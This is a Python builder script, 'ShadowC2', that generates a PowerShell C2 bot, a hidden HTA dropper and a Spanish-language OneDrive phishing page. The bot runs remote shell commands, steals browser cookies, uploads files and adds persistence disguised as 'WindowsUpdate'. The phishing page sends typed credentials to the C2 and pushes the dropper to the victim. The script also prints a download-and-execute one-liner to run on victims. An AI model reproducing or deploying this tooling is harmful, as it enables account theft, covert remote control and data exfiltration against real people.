#!/usr/bin/env python3
"""
ShadowC2 - Payload Builder v2
Genera droppers HTA, PowerShell y páginas de phishing
"""

import os
import base64
import argparse
from pathlib import Path

C2_IP = "192.168.1.14"
C2_PORT = "8000"
C2_URL = f"http://{C2_IP}:{C2_PORT}"

# ============ POWERSHELL BOT ============
PS_BOT = '''$IP = "''' + C2_IP + '''"
$PORT = "''' + C2_PORT + '''"
$BOTID = -join ((48..57) + (97..102) | Get-Random -Count 8 | ForEach-Object {[char]$_})

function Register-Bot {
    $body = @{
        bot_id = $BOTID
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        os = (Get-CimInstance Win32_OperatingSystem).Caption
        capabilities = @("shell","screenshot","info","persist","cookies","passwords","processes","download","upload")
    } | ConvertTo-Json -Depth 10
    
    try {
        Invoke-RestMethod -Uri "http://$IP`:$PORT/c2/clear/register" -Method POST -Body $body -ContentType "application/json"
        return $true
    } catch { return $false }
}

function Check-Commands {
    try {
        $resp = Invoke-RestMethod -Uri "http://$IP`:$PORT/c2/clear/check/$BOTID" -Method GET
        return $resp.commands
    } catch { return @() }
}

function Send-Result($cmdId, $result) {
    $body = @{ cmd_id = $cmdId; result = $result } | ConvertTo-Json -Depth 10
    try {
        Invoke-RestMethod -Uri "http://$IP`:$PORT/c2/clear/result/$BOTID" -Method POST -Body $body -ContentType "application/json"
    } catch {}
}

function Execute-Shell($cmd) {
    try {
        $output = Invoke-Expression $cmd 2>&1 | Out-String
        return $output
    } catch { return $_.Exception.Message }
}

function Take-Screenshot {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
        $ms = New-Object System.IO.MemoryStream
        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
        $imgData = [Convert]::ToBase64String($ms.ToArray())
        return @{image_data = $imgData} | ConvertTo-Json
    } catch { return @{error = $_.Exception.Message} | ConvertTo-Json }
}

function Get-SystemInfo {
    return @{
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        os = (Get-CimInstance Win32_OperatingSystem).Caption
        cpu = (Get-CimInstance Win32_Processor).Name
        memory = "$([math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)) GB"
        disk = (Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'").Size / 1GB
    } | ConvertTo-Json
}

function Get-Processes {
    $procs = Get-Process | Select-Object -First 50 Name, Id, CPU, WorkingSet
    return @{processes = $procs} | ConvertTo-Json -Depth 5
}

function Extract-Cookies {
    $cookies = @{}
    $chromePath = "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Cookies"
    if (Test-Path $chromePath) {
        try {
            # Chrome cookies (SQLite) - requires copying because file is locked
            $tempDb = "$env:TEMP\\chrome_cookies_temp.db"
            Copy-Item $chromePath $tempDb -Force
            Add-Type -AssemblyName "System.Data.SQLite" -ErrorAction SilentlyContinue
            if ($?) {
                $conn = New-Object System.Data.SQLite.SQLiteConnection "Data Source=$tempDb"
                $conn.Open()
                $cmd = $conn.CreateCommand()
                $cmd.CommandText = "SELECT host_key, name, value FROM cookies LIMIT 20"
                $reader = $cmd.ExecuteReader()
                $chromeCookies = @()
                while ($reader.Read()) {
                    $chromeCookies += @{host=$reader["host_key"]; name=$reader["name"]; value=$reader["value"].Substring(0,[Math]::Min(30,$reader["value"].Length))}
                }
                $conn.Close()
                $cookies["chrome"] = $chromeCookies
            } else {
                $cookies["chrome"] = "SQLite assembly not available"
            }
            Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
        } catch {
            $cookies["chrome_error"] = $_.Exception.Message
        }
    }
    
    # Edge
    $edgePath = "$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Cookies"
    if (Test-Path $edgePath) {
        $cookies["edge"] = "Edge cookies found but locked"
    }
    
    return @{cookies_found = $cookies.Count; browsers = $cookies} | ConvertTo-Json -Depth 5
}

function Extract-Passwords {
    # Requires mimikatz or similar - placeholder
    $passes = @{}
    $loginData = "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data"
    if (Test-Path $loginData) {
        $passes["chrome"] = "Login Data found - requires DPAPI decryption"
    }
    return @{passwords_found = 0; browsers = $passes; note = "Use mimikatz for full extraction"} | ConvertTo-Json -Depth 5
}

function Download-File($filepath) {
    try {
        if (-not (Test-Path $filepath)) { return "File not found: $filepath" }
        $bytes = [System.IO.File]::ReadAllBytes($filepath)
        $b64 = [Convert]::ToBase64String($bytes)
        $filename = Split-Path $filepath -Leaf
        $body = @{filename = $filename; original_path = $filepath; file_data = $b64} | ConvertTo-Json -Depth 5
        Invoke-RestMethod -Uri "http://$IP`:$PORT/c2/clear/file/$BOTID" -Method POST -Body $body -ContentType "application/json"
        return "File uploaded: $filename"
    } catch { return $_.Exception.Message }
}

function Establish-Persistence {
    try {
        $path = "$env:APPDATA\\Microsoft\\Windows\\Update.ps1"
        $script = 'while($true){try{$c=IRM -Uri "http://' + $IP + ':' + $PORT + '/c2/clear/check/' + $BOTID + '" -Method GET;foreach($cmd in $c.commands){$r="";if($cmd.command -eq "shell"){$r=IEX $cmd.args[0] 2>&1|Out-String};if($cmd.command -eq "info"){$r=@{hostname=$env:COMPUTERNAME;username=$env:USERNAME}|ConvertTo-Json};$b=@{cmd_id=$cmd.cmd_id;result=$r}|ConvertTo-Json;IRM -Uri "http://' + $IP + ':' + $PORT + '/c2/clear/result/' + $BOTID + '" -Method POST -Body $b -ContentType "application/json"}Start-Sleep 10}catch{Start-Sleep 10}}'
        Set-Content -Path $path -Value $script
        Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsUpdate" -Value "powershell -WindowStyle Hidden -File $path"
        return "Persistence established: $path"
    } catch { return $_.Exception.Message }
}

# MAIN
if (Register-Bot) {
    while ($true) {
        $commands = Check-Commands
        foreach ($cmd in $commands) {
            $result = switch ($cmd.command) {
                "shell" { Execute-Shell ($cmd.args[0]) }
                "screenshot" { Take-Screenshot }
                "info" { Get-SystemInfo }
                "processes" { Get-Processes }
                "cookies" { Extract-Cookies }
                "passwords" { Extract-Passwords }
                "download" { Download-File ($cmd.args[0]) }
                "persist" { Establish-Persistence }
                "kill" { exit }
                default { "Unknown command: $($cmd.command)" }
            }
            Send-Result $cmd.cmd_id $result
        }
        Start-Sleep -Seconds 10
    }
}
'''

# ============ HTA DROPPER ============
HTA_TEMPLATE = '''<html>
<head>
<title>System Update</title>
<hta:application id="WindowsUpdate" border="none" caption="no" showintaskbar="no" windowstate="minimize"/>
<script language="VBScript">
Sub Window_OnLoad
    Window.ResizeTo 1,1
    Window.MoveTo -5000,-5000
    
    Dim shell, fso, temp, psPath, psScript
    Set shell = CreateObject("WScript.Shell")
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    temp = shell.ExpandEnvironmentStrings("%TEMP%")
    psPath = temp & "\\sysupdate.ps1"
    
    ' PowerShell script content
    psScript = "{ps_b64}"
    
    ' Decode and save
    Dim stream
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 'Binary
    stream.Open
    stream.Write DecodeBase64(psScript)
    stream.SaveToFile psPath, 2
    stream.Close
    
    ' Execute hidden
    shell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & psPath & """", 0, False
    
    ' Persistence
    shell.RegWrite "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate", "powershell -WindowStyle Hidden -File """ & psPath & """", "REG_SZ"
    
    ' Cleanup and close
    Window.Close
End Sub

Function DecodeBase64(base64String)
    Dim xml, node
    Set xml = CreateObject("MSXml2.DOMDocument")
    Set node = xml.createElement("base64")
    node.dataType = "bin.base64"
    node.Text = base64String
    DecodeBase64 = node.nodeTypedValue
End Function
</script>
</head>
<body>
</body>
</html>'''

# ============ PHISHING PAGE ============
PHISH_TEMPLATE = '''<!DOCTYPE html>
<html>
<head>
    <title>OneDrive - Documento Compartido</title>
    <meta charset="UTF-8">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f3f2f1; }
        .header { background: #0078d4; color: white; padding: 12px 24px; display: flex; align-items: center; }
        .header img { height: 24px; margin-right: 10px; }
        .container { max-width: 480px; margin: 60px auto; background: white; padding: 40px; border-radius: 2px; box-shadow: 0 2px 6px rgba(0,0,0,0.1); }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 120px; }
        h2 { font-weight: 600; font-size: 24px; margin-bottom: 8px; color: #323130; }
        .subtitle { color: #605e5c; margin-bottom: 24px; font-size: 14px; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #8a8886; border-radius: 2px; font-size: 14px; }
        input:focus { outline: none; border-color: #0078d4; }
        button { width: 100%; padding: 12px; background: #0078d4; color: white; border: none; border-radius: 2px; font-size: 14px; cursor: pointer; margin-top: 16px; }
        button:hover { background: #106ebe; }
        .footer { text-align: center; margin-top: 24px; font-size: 12px; color: #605e5c; }
        #loading { display: none; text-align: center; padding: 20px; }
        .spinner { border: 3px solid #f3f2f1; border-top: 3px solid #0078d4; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="header">
        <svg viewBox="0 0 24 24" width="24" height="24" fill="white"><path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96z"/></svg>
        <span>OneDrive</span>
    </div>
    
    <div class="container" id="login-box">
        <div class="logo">
            <svg viewBox="0 0 120 80" fill="#0078d4"><path d="M40 20 L80 20 L100 40 L80 60 L40 60 L20 40 Z"/></svg>
        </div>
        <h2>Iniciar sesión</h2>
        <p class="subtitle">Para acceder al documento compartido</p>
        <input type="email" id="email" placeholder="Correo electrónico, teléfono o Skype" value="">
        <input type="password" id="password" placeholder="Contraseña">
        <button onclick="login()">Siguiente</button>
        <div class="footer">
            <p>¿No tiene una cuenta? <a href="#">Cree una.</a></p>
            <p>© 2026 Microsoft</p>
        </div>
    </div>
    
    <div id="loading">
        <div class="spinner"></div>
        <p>Verificando credenciales...</p>
    </div>

    <script>
        function login() {
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;
            
            document.getElementById('login-box').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            // Send credentials to C2
            fetch('{c2_url}/api/credentials', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({email: email, password: password, source: 'onedrive_phish'})
            }).catch(() => {});
            
            // Download HTA after 2 seconds
            setTimeout(function() {
                var a = document.createElement('a');
                a.href = '{c2_url}/dropper.hta';
                a.download = 'Documento_Compartido.hta';
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                
                setTimeout(function() {
                    document.getElementById('loading').innerHTML = 
                        '<p style="color: green;">&#10003; Documento listo para descargar</p>' +
                        '<p style="font-size: 12px; color: #666;">Si la descarga no inicia automáticamente, <a href="{c2_url}/dropper.hta">haga clic aquí</a></p>';
                }, 1000);
            }, 2000);
        }
    </script>
</body>
</html>'''

def build_all():
    output_dir = Path(__file__).parent / "output"
    output_dir.mkdir(exist_ok=True)
    
    # 1. Save PowerShell bot
    ps_path = output_dir / "bot.ps1"
    with open(ps_path, 'w') as f:
        f.write(PS_BOT)
    print(f"[+] PowerShell bot: {ps_path}")
    
    # 2. Build HTA with embedded PS
    ps_b64 = base64.b64encode(PS_BOT.encode('utf-16le')).decode()
    hta = HTA_TEMPLATE.replace("{ps_b64}", ps_b64)
    hta_path = output_dir / "dropper.hta"
    with open(hta_path, 'w') as f:
        f.write(hta)
    print(f"[+] HTA dropper: {hta_path}")
    
    # 3. Build phishing page
    phish = PHISH_TEMPLATE.replace("{c2_url}", C2_URL)
    phish_path = output_dir / "index.html"
    with open(phish_path, 'w') as f:
        f.write(phish)
    print(f"[+] Phishing page: {phish_path}")
    
    print(f"\n[+] C2 Server: {C2_URL}")
    print("[+] To serve files:")
    print(f"    cd {output_dir}")
    print("    python3 -m http.server 8080")
    print("\n[+] On victim Windows (as Admin):")
    print("    powershell -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.14:8080/bot.ps1')\"")
    print("\n[+] Or open the HTA file (double-click)")

if __name__ == "__main__":
    build_all()
